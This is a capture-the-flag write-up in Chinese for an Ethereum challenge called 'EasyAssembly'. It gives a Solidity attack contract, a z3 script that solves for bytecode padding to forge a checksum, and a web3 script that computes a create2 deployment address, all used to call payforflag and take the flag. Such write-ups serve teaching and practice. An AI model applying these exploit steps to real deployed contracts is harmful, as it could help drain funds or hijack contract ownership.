# EasyAssembly

* 考点有两个：
    - 在合约字节码后进行 `padding` 不会影响合约的部署
    - `create2` 创建地址的方式

* `tag` 是对字节码进行编码得到 `cs`，`pass` 是对 `cs` 进行校验，可以分析发现是对 `owner` 进行相关计算，对其结果记为 `target`，即 `cs`经过校验后等于 `target`
* 攻击合约hack，获取bytecode
```solidity
contract hack {
    address instance_address = 0xbA2e98a2795c193F58C8CE1287fDA28e089c313a ;
    EasyAssembly target = EasyAssembly(instance_address);
    
    function hack1(bytes memory code) public {
        target.payforflag(code);
    }
}
```

* 正常情况下，对合约字节码进行编码后正好等于特定某个值的几率几乎为 `0` ，所以需要另想办法，这里用到考点一，合约字节码后进行 `padding` 不会影响合约的部署
* 使用 `tag` 计算攻击合约 `hack` 字节码的 `cs` ，然后我们计算需要 `padding` 的字节
```python
from z3 import *

def find(last, target):
    t1, t2 = int(last[:8], 16), int(last[8:], 16)
    tar1, tar2 = int(target[:8], 16), int(target[8:], 16)

    s = 0x59129121
    s = BitVecVal(s, 256)
    m1 = BitVec('m1', 256)
    m2 = BitVec('m2', 256)
    m3 = BitVec('m3', 256)
    m4 = BitVec('m4', 256)

    for j in range(4):
        s = (s + s) & 0xffffffff
        p1 = (t1<<4) - m1
        p2 = t1 + s
        p3 = (t1>>5) + m2
        t2 = (t1 + (p1^(p2^p3))) & 0xffffffff
        p1 = (t2<<4) + m3
        p2 = t2 + s
        p3 = (t2>>5) - m4
        t1 = (t2 + (p1^(p2^p3))) & 0xffffffff

    sol = Solver()
    sol.add(And(t1 == tar1, t2 == tar2))
    if sol.check():
        m = sol.model()
        m_l = map(lambda x: m[x].as_long(), [m4, m3, m2, m1])
        pad = 0
        for x in m_l:
            pad <<= 0x20
            pad |= x
        return hex(pad)[2:].zfill(32)
    else:
        raise Exception('No solution')

def cal_target(address):
    a = address & 0xffffffff
    b = address>>0x20 & 0xffffffff
    c = address>>0x40 & 0xffffffff
    d = address>>0x60 & 0xffffffff
    e = address>>0x80 & 0xffffffff
    v1 = (a+b) & 0xffffffff
    v2 = ((c ^ d) + e) & 0xffffffff
    target = v2<<0x20 | v1
    print hex(target)
    return hex(target)

address = 0x000000000000000000000000082d1deb3d08277650966471756b06fead5cb43f
last = "a7f27fea495824ae"
target = cal_target(address)[2:-1]
print find(last, target)
```

* 调用 `pass` ，其中 `idx` 为 `owner` 所在的 `slot` 与 `puzzle` 数组数据起始位置的差值，是个固定值`17666428025195830108258939064971598484477117555719083663154155265588858226250` ，`bytecode` 是进行 `padding` 之后的字节码（这里需要注意字节码 `16` 字节对齐）
* 调用 `hack` 攻击合约的 `hack1` 即可，这里的 `code` 是 `create2()` 中的参数，可通过下述脚本计算，`code` 就是脚本中的 `s`
    - `Create2 : keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]`
```python
from web3 import Web3

def bytesToHexString(bs):
    return ''.join(['%02X' % b for b in bs])

bytecode = '0x608060405273ba2e98a2795c193f58c8ce1287fda28e089c313a6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100c657600080fd5b50610248806100d66000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063489dc88514610030575b600080fd5b6100e96004803603602081101561004657600080fd5b810190808035906020019064010000000081111561006357600080fd5b82018360208201111561007557600080fd5b8035906020019184600183028401116401000000008311171561009757600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506100eb565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662a9a87e82306040518363ffffffff1660e01b815260040180806020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001828103825284818151815260200191508051906020019080838360005b838110156101ab578082015181840152602081019050610190565b50505050905090810190601f1680156101d85780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b505050505056fea265627a7a72315820fc052defd6381390e09fa96b74c0f55872043fcede05171fb78f3c814d755fe664736f6c6343000511003200007197d58f43114ce23d95b93f9df2bb08'
a = '0xff'  # 1 byte
b = 'bA2e98a2795c193F58C8CE1287fDA28e089c313a'   # b: deploy address    20 bytes
c = '0'*60 + '1234'                              # c: seed    32 bytes
d = bytesToHexString(Web3.sha3(hexstr=bytecode))       # deploy bytecode   32  bytes
s = a+b+c+d
address = '0x' + bytesToHexString(Web3.sha3(hexstr=s))[24:]
print(address)
```
